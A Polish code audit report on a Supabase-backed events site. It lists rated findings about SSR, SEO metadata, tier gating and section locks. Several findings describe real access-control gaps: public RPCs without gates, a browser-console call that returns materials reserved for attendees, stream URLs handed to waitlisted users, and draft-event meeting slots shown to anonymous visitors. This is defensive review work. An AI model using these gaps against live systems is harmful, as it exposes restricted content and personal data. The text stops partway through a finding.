Ani `/events/$slug` (events.$slug.tsx:58-74), ani `/events/$slug/`nie definiują`loader`. Dane wydarzenia idą przez zwykłe `useQuery` (`events.$slug.tsx:84-88`, `events.$slug.index.tsx:112-118`), więc podczas renderu serwerowego `eventQ.data`jest`undefined`: powłoka zwraca ekran „loading" (`events.$slug.tsx:94-98`), a przegląd kończy się na `if (!eventQ.data) return null;`. Cały `<script type="application/ld+json">` z węzłem `Event` (:470-473) powstaje więc dopiero po hydratacji. Komentarz przy nim (:423-427) uzasadnia wybór treści zamiast `head()` zdaniem „ta trasa nie ma loadera" i „skrypt w treści jest dla crawlera równoprawny" - drugie zdanie jest prawdziwe tylko wtedy, gdy skrypt w tej treści jest. Sąsiednia trasa listy robi to poprawnie i ma to opisane jako zamknięty audyt: `events.index.tsx:11-13` („SSR: loader rozgrzewa ["public-events"] przez ensureQueryData") plus `ensureQueryData` w :75-92. Dodatkowo `events.$slug_.register.tsx:5-6` opiera swoją decyzję projektową na […]

**Scenariusz.** Crawler (albo scraper karty społecznościowej, albo Lighthouse) pobiera `https://…/events/kongres-2026`. W odpowiedzi HTTP dostaje pustą powłokę z napisem „Wczytywanie…", bez tytułu wydarzenia, bez daty, bez opisu i bez węzła schema.org/Event. Wydarzenie nie kwalifikuje się do rich results, a udostępniony link nie ma czego pokazać.

**Naprawa.** Dodać do `/events/$slug` loader rozgrzewający `['public-event', slug]` (i najlepiej `event_sections`) przez `context.queryClient.ensureQueryData` - dokładnie wzorcem z `events.index.tsx:75-92`, z `loadResilient`, żeby blip backendu nie dawał HTTP 500. Wtedy `head()` powłoki może też oddać prawdziwy tytuł (patrz osobne ustalenie).

**Weryfikacja.** src/routes/events.$slug.tsx:56-73 - createFileRoute ma wyłącznie `component` i `head`, żadnego `loader`; dane idą przez useQuery bez prefetchu (:84-88). src/routes/events.$slug.index.tsx:97-99 - trasa liścia ma tylko `component`, dane też przez useQuery (:112-118), a render kończy się `if (!eventQ.data) return null;` (:253). Powłoka przy braku danych rysuje ekran loading/loadError (:94-107). JSON-LD powstaje w […]

### [wysoki] Wydarzenie members/tier-gated jest dla adresata bramki nieczytelne: RLS ucina wiersz, a strona pokazuje „nie udało się załadować”

`src/routes/events.$slug.tsx:99` · blad · weryfikacja: POTWIERDZONE

Powłoka pobiera wydarzenie `fetchPublicEventBySlug` -> zwykły `select` na tabeli `events` (publicQueries.ts:111-120), czyli POD RLS. Polityka `events public read` (20260812103500:36-43) wymaga od `anon` `visibility='public' AND COALESCE(min_tier_rank,0)=0`, a `events member read` (20260818065327:2-15) wymaga od zalogowanego rangi >= progu. Dla dokładnie tych osób, do których adresowana jest bramka, `maybeSingle()` zwraca `null`, więc powłoka wchodzi w `if (!eventQ.data)` i rysuje `community.common.loadError` z odnośnikiem do listy - a `<Outlet />` się nie renderuje, więc nie powstaje ani przegląd, ani żadna zakładka. Skutki idą dalej: (a) cała maszyneria `guest_mode` z `event_sections` (20260827130000:277-292) liczy dla gościa zamki sekcji wydarzenia, którego gość nie ma jak wczytać; (b) upsell warstwy w prawej kolumnie stoi na `tierBlocked = access?.reason === 'tier_required'` (events.$slug.index.tsx:317,599), a `access` bierze się z `get_event_access(ev.id)` - identyfikatora, […]

**Scenariusz.** Redakcja publikuje briefing `visibility='members'`, `min_tier_rank=2` i rozsyła link w newsletterze. Czytelnik na warstwie „member" (ranga 1) klika i widzi ekran „Nie udało się załadować" z linkiem „wróć do listy". Nie dowiaduje się ani czego dotyczy briefing, ani że wystarczy podnieść warstwę - a przycisk „Zobacz plany", który dokładnie na to czeka, jest w kodzie tej strony.

**Naprawa.** Przestawić powłokę i przegląd na `event_page_header` jako źródło pierwszego renderu (RPC jest definerowy i celowo oddaje nagłówek każdemu, kto ma slug, razem z `tier_locked`), a `fetchPublicEventBySlug` zostawić wyłącznie do trzech pól, których nagłówek nie ma (`host_user_id`, `status`, `early_rsvp_rank`) - ich brak nie może wywracać strony. Rozdzielić też „wydarzenia nie ma" od „nie masz do niego dostępu".

**Weryfikacja.** src/lib/community/publicQueries.ts:110-119 - fetchPublicEventBySlug to zwykły select z tabeli `events` pod RLS. Polityka anon (20260812103500_community_events_anon_visibility.sql:36-43) wymaga visibility='public' AND COALESCE(min_tier_rank,0)=0; polityka zalogowanych (20260818065327...:2-16) wymaga current_tier_rank() >= GREATEST(min_tier_rank,1) dla 'members'. Czyli czytelnik rangi 1 przy min_tier_rank=2 NIE […]

### [wysoki] Zakładki modułowe omijają zamki event_sections, a RPC danych nie mają bramek wcale

`src/routes/events.$slug.agenda.tsx:21` · niespojnosc · weryfikacja: POTWIERDZONE

Na przeglądzie zamek sekcji jest respektowany: `EventPageSections.tsx:70-78` odsiewa sekcje i rysuje `SectionLockCard` zamiast treści, a sekcja prelegentów ma to samo rozstrzygnięte w trasie (`events.$slug.index.tsx:563-580`). Zakładki dedykowane nie robią tego w ogóle - `events.$slug.agenda.tsx:21` montuje `EventAgendaSection` wprost, `events.$slug.speakers.tsx:81` montuje `EventSpeakersGrid`, `events.$slug.partners.tsx:31` montuje `EventSponsorsSection`; `rg 'useEventSections|isLocked'` po tych trzech organizmach i po `EventModulePage.tsx` daje zero trafień. Bramka nie stoi też niżej: `event_agenda` (20260824084741:437-576) filtruje tylko po najemcy i publikacji, `event_sponsors_public` i `event_sponsor_materials_public` (20260823160000:2590-2649) tak samo - żadna nie czyta `events.guest_mode` ani `event_page_sections.visibility`, a wszystkie trzy mają `GRANT EXECUTE ... TO anon`. Zapowiedzianej w §9 (ryzyko 2) mitygacji `event_capabilities()`, którą „każdy RPC ma wołać", nie ma w […]

**Scenariusz.** Organizator ustawia `guest_mode='teaser'` (gość widzi tylko opis i agendę) i zawęża sekcję `materials` do zapisanych. Gość wchodzi na `/events/<slug>` i widzi karty zamków - zgodnie z ustawieniem. Potem klika „Partnerzy" w pasku zakładek i dostaje pełną listę partnerów, a `supabase.rpc('event_sponsor_materials_public',{p_slug:'<slug>'})` z konsoli oddaje mu komplet materiałów zastrzeżonych dla uczestników. […]

**Naprawa.** Wprowadzić `event_capabilities(event, caller)` zgodnie z §9 i wołać ją w `event_agenda`, `event_sponsors_public`, `event_sponsor_materials_public` i `event_speakers_public` (pusty wynik + powód zamiast danych). Do czasu zmiany w bazie: `EventModulePage` powinien pobierać `useEventSections(slug)` i dla zamkniętej sekcji rysować `SectionLockCard` zamiast `children` - to zamyka rozjazd UI, ale nie zamyka wywołania RPC […]

**Weryfikacja.** src/routes/events.$slug.agenda.tsx:17-23, src/routes/events.$slug.speakers.tsx:60-79 i src/routes/events.$slug.partners.tsx:27-34 montują organizmy wprost w EventModulePage; rg 'useEventSections|isLocked' po src/routes i src/components/events/public zwraca trafienia wyłącznie w src/routes/events.$slug.index.tsx:80,136,516,563 i src/components/events/public/organisms/EventPageSections.tsx:75,111 - w […]

### [wysoki] event_my_agenda wydaje stream_url bez bramki warstwy i osobie z listy rezerwowej

`supabase/migrations/20260828085309_501cb57f-2009-48ef-9fa2-40593434ac40.sql:43` · bezpieczenstwo · weryfikacja: POTWIERDZONE

Zapytanie wybiera `s.stream_url` dla każdego wiersza `event_session_signups` wołającego z warunkiem `AND COALESCE(g.status, 'registered') <> 'cancelled'` (:61). Dwa skutki. Po pierwsze status `waitlist` przechodzi ten warunek, więc osoba, której `event_session_signup` NIE dała miejsca (`v_final := 'waitlist'`, 20260824084741:713), dostaje adres transmisji - podczas gdy siostrzana `event_session_access` wymaga wprost `g.status = 'registered'`. Po drugie funkcja nie sprawdza ani `s.min_tier_rank`, ani `s.status`, ani `e.status` (SELECT po wydarzeniu na :24-27 nie ma warunku `status='published'`), więc obniżenie warstwy po zapisie albo cofnięcie sesji do szkicu nie odbiera adresu. Front nie łagodzi tego niczym: `MyAgendaList.tsx:83-92` rysuje `<a href={item.streamUrl}>` z napisem „Dołącz do transmisji" dla każdego niepustego adresu, bez patrzenia na `signupStatus`.

**Scenariusz.** Uczestnik zapisuje się na sesję z limitem 50 miejsc, dostaje `waitlist` (miejsca zajęte). Wchodzi na `/events/<slug>/me`, widzi w „Mojej agendzie" przycisk „Dołącz do transmisji" i ogląda sesję, na którą nie ma miejsca - a licznik obsady i lista rezerwowa nadal twierdzą, że go tam nie ma.

**Naprawa.** W `event_my_agenda` zawęzić do `g.status = 'registered'`, dopisać `AND s.status = 'published'` oraz warunek publikacji wydarzenia, a `stream_url` oddawać wyłącznie po przejściu tej samej bramki co `event_session_access` (ranga sesji + bramka wydarzenia). Alternatywnie usunąć `stream_url` z tej funkcji i kazać `MyAgendaList` pobierać adres przez `event_session_access` - jedno źródło prawdy zamiast dwóch.

**Weryfikacja.** supabase/migrations/20260828085309_501cb57f-2009-48ef-9fa2-40593434ac40.sql:1-70. Podzapytanie wybiera s.stream_url (:43) i filtruje wyłącznie po tenancie, wydarzeniu, użytkowniku i `COALESCE(g.status,'registered') <> 'cancelled'` (:57-61) - status 'waitlist' przechodzi, a nadaje go event_session_signup (20260824084741:717-720). Brak sprawdzenia s.min_tier_rank, s.status oraz e.status: SELECT po wydarzeniu (:24-27) […]

### [średni] Brak notFound() - nieistniejące i robocze wydarzenie oddaje HTTP 200 z generycznym komunikatem

`src/routes/events.$slug.tsx:99` · blad · weryfikacja: POTWIERDZONE

`if (!eventQ.data)` obsługuje jednym ekranem trzy różne sytuacje: wydarzenia nie ma, wydarzenie jest robocze/usunięte (RLS wymaga `status='published'`), oraz wołający nie przechodzi bramki warstwy. Trasa nie ma `loader`, więc nie ma też skąd rzucić `notFound()`, i nie deklaruje `notFoundComponent` - w przeciwieństwie do siostrzanych `events.$slug_.register.tsx:44-45` i `events.$slug_.manage.tsx:53-54`, które mają i `errorComponent`, i `notFoundComponent`. W efekcie każdy literówkowy albo wygasły adres `/events/<cokolwiek>` odpowiada kodem 200 ze stroną, którą crawler policzy jako miękkie 404, a monitoring jako sukces.

**Scenariusz.** Wydarzenie zostaje cofnięte do szkicu po zakończeniu. Wszystkie zewnętrzne linki (newsletter, LinkedIn, Google) zaczynają prowadzić do strony z napisem „Nie udało się załadować" i statusem 200. Wyszukiwarka trzyma adres w indeksie, bo nigdy nie dostała 404/410.

**Naprawa.** Dodać loader z `ensureQueryData` (patrz ustalenie o SSR) i rzucać w nim `notFound()`, gdy wydarzenia nie ma; dorobić `notFoundComponent` z prawdziwym 404. Osobno rozróżnić „nie ma" od „nie masz dostępu" - to drugie ma być stroną 200 z zaproszeniem, nie błędem.

**Weryfikacja.** src/routes/events.$slug.tsx:56-73 - definicja trasy ma tylko `component` i `head`: żadnego `loader`, `errorComponent` ani `notFoundComponent`, więc nie ma skąd rzucić notFound() i odpowiedź zostaje na 200. Jeden ekran `if (!eventQ.data)` (:99-107) obsługuje brak wiersza, wydarzenie nieopublikowane (RLS wymaga status='published' - 20260812103500:39, 20260818065327:5) i odmowę bramki warstwy. Kontrast realny: […]

### [średni] JSON-LD zawsze deklaruje EventScheduled, mimo że strona zna cancelled_at

`src/lib/seo/jsonld.ts:481` · blad · weryfikacja: POTWIERDZONE

`publicEventNode` wpisuje na sztywno `eventStatus: 'https://schema.org/EventScheduled'`, a komentarz nad linią (:477-480) uzasadnia to zdaniem: „Odwołanie (`events.cancelled_at`) nie jest dziś w żadnym z tych odczytów - w dniu, w którym wejdzie, wchodzi tu `EventCancelled`". Ten dzień już był: `event_page_header` oddaje `cancelled_at` (20260823170000:757) i `registration_state='event_cancelled'` (:653), a strona ma jedno i drugie w `headerQ.data` (events.$slug.index.tsx:354). `publicEventJsonLd` dostaje jednak wyłącznie kolumny z `fetchPublicEventBySlug` (:431-449), wśród których `cancelled_at` nie ma - i `EVENT_COLUMNS` (publicQueries.ts:75) też go nie pobiera. Poza JSON-LD odwołanie nie jest komunikowane nigdzie w nagłówku strony: jedynym śladem jest zdanie w bloku zapisów (registrationSurface.ts:347-349), a kafel na liście `/events` nie ma nawet tego (dla porównania `SavedEventsList.tsx:122` plakietkę odwołania rysuje).

**Scenariusz.** Kongres zostaje odwołany na trzy dni przed terminem. Google nadal pokazuje go w rich result jako zaplanowany (`EventScheduled`), a uczestnik wchodzący na stronę widzi normalną okładkę, tytuł i termin - komunikat o odwołaniu musi znaleźć w bloku zapisów w prawej kolumnie. Część osób przyjedzie.

**Naprawa.** Dodać `cancelled_at` do `EVENT_COLUMNS` i do wejścia `publicEventJsonLd`, mapować je na `eventStatus: EventCancelled` (a `postponed_to`, gdy powstanie, na `EventPostponed`), oraz narysować pas informacyjny o odwołaniu nad tytułem wydarzenia i plakietkę na kaflu listy - tym samym wzorcem, którego używa już `SavedEventsList`.

**Weryfikacja.** src/lib/seo/jsonld.ts:477-481 - `eventStatus: 'https://schema.org/EventScheduled'` na sztywno, z komentarzem, że cancelled_at „nie jest dziś w żadnym z tych odczytów". Tymczasem event_page_header deklaruje i zwraca cancelled_at (supabase/migrations/20260823170000_event_front_binding.sql:598 i :771) oraz registration_state='event_cancelled' (:654), a trasa ma nagłówek w headerQ.data […]

### [średni] Każde wydarzenie ma ten sam tytuł, opis i og:image - brak head() per wydarzenie

`src/routes/events.$slug.tsx:60` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

`head()` powłoki składa metadane ze stałych napisów: `title: lang === 'en' ? 'Event - New European Strategies' : 'Wydarzenie - New European Strategies'` i opis „Szczegóły wydarzenia, zapis i link do transmisji.". Nie dostaje ani `params`-owego wydarzenia (loadera nie ma), ani `image`, więc `buildContentHead` podstawia domyślną kartę marki (`meta.ts:169`, `defaultSocialImage`). Trasa liścia `/events/$slug/` nie ma `head()` w ogóle (:97-99). Canonical i hreflang są poprawne (`meta.ts:212-218`), ale wszystkie wydarzenia serwisu dzielą jeden `<title>`, jeden `og:title`, jeden `og:description` i jeden `og:image`. Ten sam wzorzec obowiązuje w noindeksowanych trasach pomocniczych (`events.saved.tsx:24`, `events.$slug.me.tsx:19`, `events.$slug_.register.tsx:28`, `events.$slug_.manage.tsx:42`), gdzie napisy są dodatkowo wyłącznie po polsku, bez wariantu EN - bramka `check:i18n-hardcoded` tego nie łapie, bo szuka rozgałęzień `isPl ? … : …`, a nie polskich literałów […]

**Scenariusz.** Redakcja wrzuca na LinkedIn linki do trzech różnych kongresów. Wszystkie trzy karty pokazują ten sam tytuł „Wydarzenie - New European Strategies", ten sam opis i tę samą grafikę marki. W SERP-ie te same trzy strony konkurują ze sobą identycznym tytułem.

**Naprawa.** Po dodaniu loadera (patrz ustalenie o SSR) przepiąć `head()` powłoki na dane wydarzenia: `title` z `title_pl/_en`, `description` z opisu, `image` z `cover_url`, `type: 'article'` z `publishedAt`. Dla tras pomocniczych oprzeć napisy o `activeLang(url)` tak jak robi to `events.index.tsx:108-121`.

**Weryfikacja.** src/routes/events.$slug.tsx:58-72 - head() składa stałe napisy ('Event - New European Strategies' / 'Wydarzenie - New European Strategies' oraz 'Szczegóły wydarzenia, zapis i link do transmisji.'), bez `image` i bez dostępu do wydarzenia (loadera nie ma). buildContentHead przy braku input.image podstawia defaultSocialImage(origin) (src/lib/seo/meta.ts:169), więc wszystkie wydarzenia dzielą jedną kartę. Trasa liścia […]

### [średni] Sekcja „registration” z event_sections jest na przeglądzie ignorowana - przełącznik i zamek nie działają

`src/routes/events.$slug.index.tsx:396` · niespojnosc · weryfikacja: POTWIERDZONE

Trasa pobiera wiersz sekcji: `const registrationSection = findEventSection(sectionsQ.data ?? [], 'registration')` - i używa go WYŁĄCZNIE do nagłówka (`eventSectionHeading(...)`, :403). Pole `registrationSection.isLocked` nie jest czytane ani razu, a `null` (sekcja wyłączona przez redakcję, bo `event_sections` takich w ogóle nie zwraca - 20260827130000:291 `WHERE m.visible`) daje tylko fallback nagłówka ze słownika, po czym powierzchnia zapisów renderuje się tak samo (:626-661). Dla porównania sekcje `description` (:516) i `speakers` (:563) mają tę gałąź obsłużoną. Rozjazd jest obustronny: wyłączenie sekcji „Zapisy" w studiu nie chowa kontrolki, a zamek policzony przez bazę (np. `guest_mode='hidden'` zwraca `registration_required` dla WSZYSTKICH sekcji, łącznie z `registration` - 20260827130000:283-284) jest cicho odrzucany.

**Scenariusz.** Organizator wyłącza w studiu sekcję „Zapisy" na wydarzeniu, na które zapisy prowadzi zewnętrzny partner. `event_sections` przestaje zwracać wiersz `registration`, ale strona nadal rysuje przycisk zapisu z nagłówkiem ze słownika. Uczestnicy zapisują się dwoma kanałami i listy się rozjeżdżają.

**Naprawa.** Rozstrzygnąć świadomie i zapisać w kodzie: albo powierzchnia zapisów honoruje `registrationSection === null` / `.isLocked` tak jak `description` i `speakers`, albo `registration` wypada z `_event_default_sections()` jako sekcja niekonfigurowalna. Przy okazji przemyśleć drabinkę `guest_mode='hidden'`, która dziś zamyka gościowi także sekcję zapisu - czyli zamek z powodem „zapisz się” na jedynej kontrolce zapisu.

**Weryfikacja.** src/routes/events.$slug.index.tsx:396 pobiera `registrationSection = findEventSection(sectionsQ.data ?? [], 'registration')`, a jedyne jego użycie to `eventSectionHeading(registrationSection,'registration',lang,t)` na :403; `registrationSection.isLocked` nie pada w pliku ani razu (rg 'isLocked' po tej trasie daje :516 description i :563 speakers). Powierzchnia zapisów renderuje się bezwarunkowo z headerQ/surface […]

### [średni] Ta sama podstrona modułowa żyje pod dwoma adresami z dwoma self-canonical

`src/components/events/public/atoms/EventPageLink.tsx:53` · niespojnosc · weryfikacja: POTWIERDZONE

Pozycja modułowa jest linkowana do trasy dedykowanej `/events/<slug>/<module>` (:66-70), ale wiersz `pages`, z którego bierze się jej treść, nadal ma pełną ścieżkę publiczną - `event_menu` składa ją rekurencyjnie i zwraca w kolumnie `path` (20260827065451:913). Trasa splat `/$` obsługuje tę ścieżkę i buduje dla niej własny `buildContentHead` z canonical wskazującym na siebie (`src/routes/$.tsx:410-422`). Trasa modułowa robi to samo pod swoim adresem (przez `head()` powłoki). Nic tych dwóch adresów nie łączy: `EventModulePage` renderuje ten sam dokument (`resolvedContentQueryOptions(segments)`, EventModulePage.tsx:70-74) i nie ustawia `canonicalOverride`. Dodatkowo żaden z tych adresów nie dostaje `noindex` przy `events.chatham_house = true`, mimo że §7 wymaga wprost: „przy chatham_house = true lista uczestników i nagranie nie mogą trafić do trybu gościa ani do robota (forceNoindex)".

**Scenariusz.** Kongres ma podstronę „Uczestnicy" pod `/kongres-2026/uczestnicy` (trasa splat, z dokumentu CMS) i pod `/events/kongres-2026/participants` (trasa modułowa). Crawler indeksuje obie z identyczną treścią wstępu i dwoma sprzecznymi canonicalami; ranking rozjeżdża się między dwa adresy, a przy zmianie tytułu strony aktualizuje się tylko jeden z nich.

**Naprawa.** Ustawić na trasie modułowej `canonicalOverride` na jej własny adres i wymusić na trasie splat canonical wskazujący trasę modułową dla stron z niepustym `event_pages.module` (albo w ogóle przekierować splat -> trasa modułowa 301). Osobno: dodać `robots: noindex` na trasie `/events/$slug/participants` i na stronie wydarzenia, gdy `chatham_house` jest włączone.

**Weryfikacja.** src/components/events/public/atoms/EventPageLink.tsx:53-79 - pozycja z niepustym `module` idzie do EVENT_MODULE_ROUTE[module] z params {slug}, a pozycja zwykła do `/$` z params {_splat: item.path}; sam wiersz nadal ma pełną ścieżkę, bo event_menu zwraca `public._event_page_path(pg.id)` (20260827065451...:907). Trasa splat obsługuje tę ścieżkę i buduje własny buildContentHead z canonical z bieżącego URL-a […]

### [średni] „Transmisja dostępna” w agendzie bez żadnego linku - event_session_access nie ma konsumenta

`src/components/events/public/molecules/AgendaSessionCard.tsx:196` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

Karta sesji rysuje wiersz z ikoną wideo i napisem `eventFront.agenda.streamAvailable`, gdy `session.hasStream` (flaga `has_stream` z `event_agenda`). Wiersz jest czystym `<dd>` - nie ma pod nim ani odnośnika, ani przycisku. Cała ścieżka do adresu transmisji sesji jest napisana i niepodpięta: `fetchSessionAccess` (publicEventApi.ts:202-215) i hook `useSessionAccess` (usePublicEvent.ts:204-215) nie mają w `src/` ani jednego konsumenta produkcyjnego - `rg 'useSessionAccess|fetchSessionAccess'` zwraca wyłącznie same definicje i cztery atrapy w testach. Jedynym miejscem, w którym adres transmisji sesji trafia do interfejsu, jest `/events/<slug>/me` i tylko dla własnych zapisów (MyAgendaList.tsx:83-92) - czyli sesje bez zapisu (`requires_signup=false`) nie mają w serwisie ŻADNEJ drogi do transmisji.

**Scenariusz.** W dniu wydarzenia online uczestnik otwiera `/events/<slug>/agenda`, znajduje sesję plenarną z podpisem „Transmisja dostępna" i nie ma w co kliknąć. Sesja nie wymaga zapisu, więc nie pojawi się też w „Mojej agendzie". Uczestnik pisze do organizatora po link.

**Naprawa.** Podpiąć `useSessionAccess(session.id, enabled)` w `AgendaSessionCard` dla sesji z `hasStream`/`hasRecording` i zamienić napis na przycisk („Dołącz do transmisji" / „Obejrzyj nagranie" / powód odmowy z pola `reason`). Zapytanie ma wystartować dopiero po rozwinięciu karty albo dla sesji trwających, żeby agenda z 30 sesjami nie wysyłała 30 wywołań. Warunek konieczny: naprawa bramek w `event_session_access` (osobne […]

**Weryfikacja.** src/components/events/public/molecules/AgendaSessionCard.tsx:196-202 - przy session.hasStream renderowany jest wyłącznie <dt class=sr-only> + <dd> z napisem eventFront.agenda.streamAvailable, bez <a> i bez przycisku (flaga pochodzi z has_stream w event_agenda, 20260824084741:519). rg 'useSessionAccess|fetchSessionAccess' po src/ daje wyłącznie definicje (src/lib/events/publicEventApi.ts:202, […]

### [niski] AddToCalendar nie zna adresu strukturalnego ani fallbacku języka opisu

`src/components/community/AddToCalendar.tsx:31` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

`toCalendarInput` przekazuje `location: event.location`, czyli WYŁĄCZNIE starą kolumnę wolnotekstową, która w studiu jest polem „nazwa miejsca" (EventGeneralPanel.tsx:301-306) obok pięciu osobnych pól adresu: `street_address`, `postal_code`, `city`, `region`, `country` (:307-339). Pięciu kolumn, które `schema.org/Event` już dostaje (events.$slug.index.tsx:443-448) i z których `eventAddressLine` składa linię na stronie, plik kalendarza nie widzi. To jest dokładnie pozycja wymieniona w §8 jako „E1 - zostało: odzwierciedlenie nowych pól na froncie publicznym (adres strukturalny w schema.org/Event i AddToCalendar)"; pierwsza połowa jest zrobiona, druga nie. Drugi, mniejszy defekt w tej samej funkcji: `const description = lang === 'en' ? event.description_en : event.description_pl` (:26) nie ma fallbacku na drugi język - czyli powtarza błąd, który w tej samej iteracji naprawiono na stronie (events.$slug.index.tsx:257-276) i na kaflu listy (events.index.tsx:281-286).

**Scenariusz.** Organizator wypełnia w studiu nazwę sali oraz ulicę, kod i miasto. Uczestnik klika „Dodaj do kalendarza" -> Google. W wydarzeniu w telefonie pole lokalizacji zawiera samą nazwę sali („Sala Kolumnowa"), bez adresu, więc nawigacja nie ma czego uruchomić. Przy wydarzeniu opisanym wyłącznie adresem strukturalnym pole lokalizacji jest puste. Uczestnik z interfejsem EN dostaje dodatkowo wydarzenie bez opisu, mimo że opis […]

**Naprawa.** Przekazać do `CalendarEventInput` linię złożoną tym samym `eventAddressLine`, którego używa strona i JSON-LD (`[nazwa miejsca, adres strukturalny]` połączone przecinkiem), i wyrównać opis do wzorca `a || b` z `events.$slug.index.tsx:276`.

**Weryfikacja.** src/components/community/AddToCalendar.tsx:20-35 - toCalendarInput przekazuje `location: event.location` (:30), czyli samą wolnotekstową kolumnę, i `description = lang === 'en' ? event.description_en : event.description_pl` (:26) bez fallbacku na drugi język. Pięć kolumn adresu jest w migawce i JEST używane w JSON-LD strony (src/routes/events.$slug.index.tsx:443-448: streetAddress, postalCode, city, region, country) […]

---

## Widgety buildera

> Builder ma siedem widgetów wydarzeń (`speakers`, `event-schedule`, `event-list`, `event-countdown`, `event-countdown-card`, `event-sponsors`, `meeting-booking`) zarejestrowanych w `src/lib/builder/registry.tsx:1303-1526`, renderowanych z `src/components/builder/organisms/widget-view/Event*.tsx` i edytowanych dedykowanymi panelami (schema w `schemas.ts` jest dla nich celowo pusta). Warstwa danych (`src/lib/builder/eventsQuery.ts`, `speakersQuery.ts`, `meetingsQuery.ts`) jest poprawnie odseparowana od widoków, ma prefetch SSR (`prefetch.ts:187-215`), tenantowo zakresowany cache brzegowy (`ssrCache.ts`) i jest objęta bramkami `settingsFidelity`, `sampleDataLeak` oraz `localizedQueryKeys`. Kluczowy problem: moduł Event Builder zbudował własny, bogaty backend (`event_sessions`, `event_sponsors`, `event_meeting_*`, `event_types`, `guest_mode`) i własny renderer trasy `/events/$slug`, ale widgety buildera pozostały na starym kontrakcie — agenda i sponsorzy nadal tylko z JSON-a widgetu (wprost wbrew §0.2 specyfikacji), `event-list` etykietuje po `events.kind`, którego studio nie zapisuje, a […]

### [wysoki] `event-list` etykietuje i filtruje po `events.kind`, którego studio wydarzeń nigdy nie zapisuje

`src/components/builder/organisms/widget-view/EventsListView.tsx:64` · niespojnosc · weryfikacja: POTWIERDZONE

Widget rysuje plakietkę rodzaju z `events.kind`: `KindBadge` → `eventKindLabel(kind, lang)` (EventsListView.tsx:61-67, użycia :120 i :169), a panel oferuje filtr `kind` z zaszytą listą sześciu wartości (schemas.ts:1868-1882; ta sama lista w eventsQuery.ts:35-42). Tymczasem moduł Event Builder rozdzielił rodzaj (`event_types`, `events.event_type_id`) od formatu (`events.format`), a `events.kind` jest tylko kolumną ZGODNOŚCI: `admin_event_create` wylicza ją mapowaniem z formatu, gdy klucz rodzaju wypada poza legacy szóstkę (20260823136000_event_builder_review_fixes.sql:204-214), `admin_event_type_reassign` przy przepięciu na rodzaj spoza szóstki ZOSTAWIA starą wartość (20260823120000_event_builder_foundation.sql:784-796), a panel Ogólne w studiu zapisuje `format` i w ogóle nie dotyka `kind` (`rg '\bkind\b' src/components/admin/events/organisms/EventGeneralPanel.tsx` — zero trafień). Publiczna trasa `/events` już to naprawiła i czyta `events.format`, z komentarzem wprost: „Poprzednio […]

**Scenariusz.** Tenant zakłada własny rodzaj „Kongres" (`event_types.key = 'kongres'`, `default_format = 'onsite'`). `admin_event_create` wpisuje `kind = 'in_person'`. Organizator zmienia w studiu format na „online" — `kind` zostaje `in_person`. Na `/events` kafel pokazuje poprawnie „Online", a widget `event-list` na stronie głównej pokazuje dla tego samego wydarzenia „Stacjonarne". Filtr „Rodzaj" w panelu widgetu nie ma w ogóle […]

**Naprawa.** Dołożyć `format` i `event_type_id` do `EVENT_LIST_COLUMNS` (eventsQuery.ts:32-33), zamienić `KindBadge` na plakietkę formatu (mapa jak `EVENT_FORMAT_KEY` w events.index.tsx:262-266) lub na nazwę rodzaju z publicznego `event_types_active()` (grant dla `anon`, 20260823120000:465; klient gotowy w src/lib/events/eventTypesApi.ts:17), a filtr `kind` w schemas.ts:1868 zastąpić selektem `type_key` zasilanym z katalogu […]

**Weryfikacja.** Wszystkie cztery ogniwa sprawdzone. (1) Widget rysuje plakietkę z `row.kind`: `KindBadge` → `eventKindLabel(kind, lang)` (src/components/builder/organisms/widget-view/EventsListView.tsx:61-66, użycia w kartach :120 i w wierszach :169). (2) Zapytanie pobiera `kind` i po nim filtruje: `EVENT_LIST_COLUMNS` (src/lib/builder/eventsQuery.ts:33-34) oraz `if (input.kind) q = q.eq("kind", input.kind)` (eventsQuery.ts:87), […]

### [wysoki] `get_public_meeting_slots` nie bramkuje statusu wydarzenia — widget w trybie „event" pokazuje anonimowi terminy wydarzenia niepublikowanego

`supabase/migrations/20260728090000_meeting_slots_networking.sql:163` · bezpieczenstwo · weryfikacja: NIEZWERYFIKOWANE

Predykat funkcji to wyłącznie `ms.tenant_id = public_tenant_id() AND (ms.is_public OR ms.host_user_id = auth.uid()) AND (p_event_id IS NULL OR ms.event_id = p_event_id) AND ms.starts_at >= now() - interval '1 hour'` (linie 160-166) — ani `JOIN public.events`, ani warunku `e.status = 'published'`, ani sprawdzenia `guest_mode`. Funkcja ma `GRANT EXECUTE … TO anon` (linia 173), a widget przekazuje `p_event_id` wprost z treści (meetingsQuery.ts:94). To jest odstępstwo od reguły, którą wszystkie pozostałe publiczne projekcje wydarzeń trzymają: `event_speakers_public` (20260827154053…:38-41), `event_agenda`, `event_sponsors_public` mają `AND e.status = 'published'`, a nowy `event_meeting_free_slots` dodatkowo wymaga zalogowania i rejestracji na wydarzenie (20260823190000:3870-3891).

**Scenariusz.** Redaktor wstawia na publiczną (już opublikowaną) stronę widget „Networking 1-1" w trybie „wydarzenie" i wybiera z `EventPicker` wydarzenie w statusie `draft` — picker celowo je pokazuje (EventPicker.tsx:41-45). Jeśli jakikolwiek host opublikował slot z `event_id` tego szkicu, anonimowy odwiedzający widzi na żywo daty, godziny, nazwiska i awatary hostów oraz pole „Miejsce" (np. „stolik B2" albo link do rozmowy) […]

**Naprawa.** Dodać w `get_public_meeting_slots` `JOIN public.events e ON e.id = ms.event_id` z `e.status = 'published' AND e.tenant_id = public_tenant_id()` dla gałęzi z `p_event_id` (sloty bez `event_id` zostają bez zmian), i rozważyć domknięcie `events.guest_mode <> 'hidden'`. Dodatkowo `eventsQuery`-owy wzorzec `.eq("status","published")` powinien mieć swój odpowiednik po stronie widgetu, żeby wybór szkicu w pickerze dawał […]

### [wysoki] `meeting-booking` w trybie „wydarzenie" czyta silnik, do którego moduł Event Builder nic nie zapisuje

`src/lib/builder/meetingsQuery.ts:93` · niespojnosc · weryfikacja: NIEZWERYFIKOWANE

